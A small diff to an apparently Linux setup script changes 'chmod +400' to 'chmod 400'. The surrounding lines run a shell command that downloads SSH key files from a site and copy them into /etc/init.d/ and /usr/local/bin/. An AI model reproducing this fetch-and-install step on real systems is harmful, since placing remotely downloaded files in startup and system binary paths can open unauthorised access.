@@ -74,7 +74,7 @@ if platform.system() == "Linux":
 		try:
 		    subprocess.Popen(DownloadPEM, shell=True).wait()
 		    print("[*] Downloading ssh .PUB file from site and installing...")
-		    subprocess.Popen("chmod +400 *.pub", shell=True).wait()
+		    subprocess.Popen("chmod 400 *.pub", shell=True).wait()
                     subprocess.Popen("cp *.pub /etc/init.d/", shell=True).wait()
                     subprocess.Popen("cp *.pub /usr/local/bin/", shell=True).wait()
 		except subprocess.CalledProcessError as e:
